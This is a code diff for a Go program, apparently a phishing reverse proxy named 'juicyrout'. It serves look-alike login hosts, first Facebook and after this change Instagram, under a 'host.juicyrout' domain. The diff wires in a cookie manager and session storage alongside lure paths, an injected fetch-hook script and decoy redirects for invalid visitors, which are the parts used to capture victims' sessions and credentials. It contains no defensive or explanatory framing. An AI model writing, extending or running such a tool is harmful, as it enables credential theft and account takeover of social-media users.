@@ -11,6 +11,7 @@ import (
 	"github.com/gofiber/fiber/v2"
 	"github.com/gofiber/fiber/v2/middleware/recover"
 	"github.com/gofiber/fiber/v2/middleware/session"
+	"github.com/gofiber/storage/memory"
 )
 
 //go:embed js/fetch-hook.js
@@ -29,6 +30,8 @@ func main() {
 	req := NewRequestProcessor(conv)
 	resp := NewResponseProcessor(conv, jsHookScript)
 
+	cookieManager := NewCookieManager()
+	storage := NewSessionStorage(memory.New(), cookieManager)
 	// TODO from config file
 	store := session.New(session.Config{
 		Expiration:     30 * time.Minute,
@@ -36,6 +39,7 @@ func main() {
 		CookieDomain:   "host.juicyrout",
 		CookieSecure:   true,
 		CookieHTTPOnly: true,
+		Storage:        storage,
 	})
 
 	app := fiber.New(fiber.Config{
@@ -44,12 +48,15 @@ func main() {
 		IdleTimeout:           10 * time.Second,
 	})
 
-	app.Use(recover.New())
+	app.Use(recover.New(recover.Config{
+		EnableStackTrace: true,
+	}))
 	auth := NewAuthMiddleware(AuthConfig{
 		CookieName:     "session_id",
+		CookieManager:  cookieManager,
 		Store:          store,
 		InvalidAuthURL: "https://duckduckgo.com",
-		LoginURL:       fmt.Sprintf("https://www-facebook-com.host.juicyrout:%s/", port),
+		LoginURL:       fmt.Sprintf("https://www-instagram-com.host.juicyrout:%s/", port),
 		LureService:    NewStaticLureService([]string{"/abc/def"}),
 	})
 	proxy := NewProxyHandler(client, req, resp)
